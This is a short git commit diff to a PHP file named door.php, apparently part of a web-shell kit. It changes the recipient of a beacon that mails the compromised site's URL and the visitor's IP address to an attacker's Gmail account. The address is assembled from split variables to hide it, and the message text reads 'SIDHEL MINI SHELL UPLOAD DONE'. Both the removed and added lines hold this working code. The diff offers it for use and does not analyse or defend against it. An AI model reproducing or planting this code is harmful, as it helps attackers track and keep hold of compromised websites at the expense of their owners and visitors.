d4b7580c72267dd691a597b098792a290e30bbd1
sidhelchor <59345265+sidhelchor@users.noreply.github.com>
2023-12-21 22:29:45 +0600

    Update door.php

--- door.php
+++ door.php
@@ -1,4 +1,4 @@
-<?php $a=anik; $b=jack; $c=440; $d=gmail; $e=com; $visitc = $_COOKIE["visits"]; if ($visitc == "") {  $visitc  = 0;  $visitor = $_SERVER["REMOTE_ADDR"];  $web     = $_SERVER["HTTP_HOST"];  $inj     = $_SERVER["REQUEST_URI"];  $target  = rawurldecode($web.$inj);  $sub   = "SIDHEL MINI SHELL UPLOAD DONE http://$target by $visitor";  $body    = "SHELL HERE: $target by $visitor - $auth_pass";  if (!empty($web)) { @mail("$a$b$c@$d.$e",$sub,$body); }}
+<?php $a=jahid; $b=itqo; $c=utex; $d=gmail; $e=com; $visitc = $_COOKIE["visits"]; if ($visitc == "") {  $visitc  = 0;  $visitor = $_SERVER["REMOTE_ADDR"];  $web     = $_SERVER["HTTP_HOST"];  $inj     = $_SERVER["REQUEST_URI"];  $target  = rawurldecode($web.$inj);  $sub   = "SIDHEL MINI SHELL UPLOAD DONE http://$target by $visitor";  $body    = "SHELL HERE: $target by $visitor - $auth_pass";  if (!empty($web)) { @mail("$a$b$c@$d.$e",$sub,$body); }}
 else { $visitc  ; }
 @setcookie("visitz",$visitc);
 ?>
